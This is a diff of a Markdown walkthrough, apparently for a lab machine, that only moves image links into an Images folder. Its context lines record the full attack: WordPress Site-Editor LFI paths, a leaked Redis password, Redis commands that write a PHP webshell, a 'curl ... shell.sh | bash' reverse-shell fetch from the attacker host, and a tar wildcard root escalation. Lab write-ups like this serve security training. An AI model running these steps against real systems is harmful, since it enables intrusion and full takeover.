@@ -134,62 +134,62 @@ Enumerated top 200 UDP ports:
 
 #### -Navigated to targets IP address and found the following webpage showing it is a WordPress site:
 
-![](Pasted%20image%2020221030121553.png)
+![](Images/Pasted%20image%2020221030121553.png)
 
 #### -Typed "wpscan --update -e p --url http://192.168.53.166 " and found the following vulnerable plugin site-editor 1.1.1:
 
-![](Pasted%20image%2020221030121703.png)
+![](Images/Pasted%20image%2020221030121703.png)
 #vunerablepluginSite-EditorVersion1 #LocalFileInclusion
 
 #### -Googled site-editor 1.1.1 exploit and found the following LFI exploit for site-editor 1.1.1:
 
-![](Pasted%20image%2020221030122057.png)
-![](Pasted%20image%2020221030122124.png)
+![](Images/Pasted%20image%2020221030122057.png)
+![](Images/Pasted%20image%2020221030122124.png)
 
 #### -Per the NMAP scan we know redis is present on the target machine. Googled "redis config location on linux" and found the following web page showing path location of "etc/redis/redis.conf":
 
 
-![](Pasted%20image%2020221030122212.png)
-![](Pasted%20image%2020221030122244.png)
+![](Images/Pasted%20image%2020221030122212.png)
+![](Images/Pasted%20image%2020221030122244.png)
 #redisConfigurationFilePathLocation
 
 #### -As instructed for LFI payload found previously I added "/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=" after the target IP address and added "/etc/redis/redis.conf". Typed "ctrl+f and pass" to find redis pass on the config file and found password "Ready4Redis?":
 
-![](Pasted%20image%2020221030122333.png)
+![](Images/Pasted%20image%2020221030122333.png)
 
 ## PORT 6379 - Redis
 
 #### - Typed "redis-cli -h 192.168.230.166" and "AUTH Ready4Redis?" to login to redis:
 
-![](Pasted%20image%2020221031162257.png)
+![](Images/Pasted%20image%2020221031162257.png)
 
 #### -Per Hacktricks website in order to attempt to gain a webshell we must know the path of the website folder:
 
-![](Pasted%20image%2020221031162348.png)
+![](Images/Pasted%20image%2020221031162348.png)
 
 #### -Googled "how to find web root directory config files in linux" and found the following web page showing the path can be referenced in the "/etc/apache2/sites-available/000-default.conf" file:
 
-![](Pasted%20image%2020221031162436.png)
-![](Pasted%20image%2020221031162502.png)
+![](Images/Pasted%20image%2020221031162436.png)
+![](Images/Pasted%20image%2020221031162502.png)
 #webrootdirectoryApacheConfigFile
 
 #### -Navigated to "http://192.168.230.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/apache2/sites-enabled/000-default.conf" and was shown the web root directory of server is located in "/var/www/html":
 
-![](Pasted%20image%2020221031162551.png)
+![](Images/Pasted%20image%2020221031162551.png)
 
 #### -Followed the steps in Hacktricks for Webshell but when attempting to save the file/config I received an error. We may not have write permissions on the directory
 
-![](Pasted%20image%2020221031162635.png)
+![](Images/Pasted%20image%2020221031162635.png)
 
 #### -Googled "redis write permission file" and found mentioned file "/etc/systemd/system/redis.service":
 
-![](Pasted%20image%2020221031162703.png)
-![](Pasted%20image%2020221031162733.png)
+![](Images/Pasted%20image%2020221031162703.png)
+![](Images/Pasted%20image%2020221031162733.png)
 #RedisWritePermissionFile
 
 #### -Navigated to "http://192.168.230.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/systemd/system/redis.service" and found we can write to "/etc/redis" and "/opt/redis-files":
 
-![](Pasted%20image%2020221031163223.png)
+![](Images/Pasted%20image%2020221031163223.png)
 
 #### -Typed the following when logged into the redis server and navigated to "http://192.168.230.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/opt/redis-files/test.php" and found the "id" command was successful:
 
@@ -197,9 +197,9 @@ config set dir /opt/redis-files
 config set dbfilename test.php
 set test "<?php system('id'); ?>"
 
-![](Pasted%20image%2020221031163319.png)
+![](Images/Pasted%20image%2020221031163319.png)
 
-![](Pasted%20image%2020221031163356.png)
+![](Images/Pasted%20image%2020221031163356.png)
 #hacktricksRedisWebshell
 
 ---
@@ -209,7 +209,7 @@ set test "<?php system('id'); ?>"
 
 #### -Typed "vim shell.sh" on kali machine and typed the following into the "shell.sh":
 
-![](Pasted%20image%2020221101000321.png)
+![](Images/Pasted%20image%2020221101000321.png)
 
 ####  Started a penelope listener on kali machine
 
@@ -219,9 +219,9 @@ config set dir /opt/redis-files
 config set dbfilename test.php
 set test "<?php system('curl 192.168.49.230/shell.sh | bash'); ?>"
 
-![](Pasted%20image%2020221101091609.png)
-![](Pasted%20image%2020221101091643.png)
-![](Pasted%20image%2020221101091725.png)
+![](Images/Pasted%20image%2020221101091609.png)
+![](Images/Pasted%20image%2020221101091643.png)
+![](Images/Pasted%20image%2020221101091725.png)
 
 ---
 
@@ -231,18 +231,18 @@ set test "<?php system('curl 192.168.49.230/shell.sh | bash'); ?>"
 
 -Ran linpeas.sh and found a script running every 3 minutes via crontab per the findings below:
 
-![](Pasted%20image%2020221101120654.png)
+![](Images/Pasted%20image%2020221101120654.png)
 
 #### -Cat'd script "/usr/local/bin/backup.sh" and found the following showing it was running tar with a wildcard:
 
-![](Pasted%20image%2020221101120754.png)
+![](Images/Pasted%20image%2020221101120754.png)
 
 #### -Googled "tar wildcard privilege escalation" and found the follwoing web page showing the step to add commands to have the script add user alice to the sudoers list and to have alice run any command with sudo:
 
-![](Pasted%20image%2020221101120828.png)
+![](Images/Pasted%20image%2020221101120828.png)
 
-![](Pasted%20image%2020221101120854.png)
-![](Pasted%20image%2020221101120920.png)
+![](Images/Pasted%20image%2020221101120854.png)
+![](Images/Pasted%20image%2020221101120920.png)
 #TarWildcardPrivilegeEscalation
 
 
@@ -251,7 +251,7 @@ set test "<?php system('curl 192.168.49.230/shell.sh | bash'); ?>"
 
 #### -Followed all the steps in the "/var/www/html" directory. Waited a few minutes for the cronjob/script to run. Typed "sudo su" and received a root shell:
 
-![](Pasted%20image%2020221101121057.png)
+![](Images/Pasted%20image%2020221101121057.png)
 
 ---
 
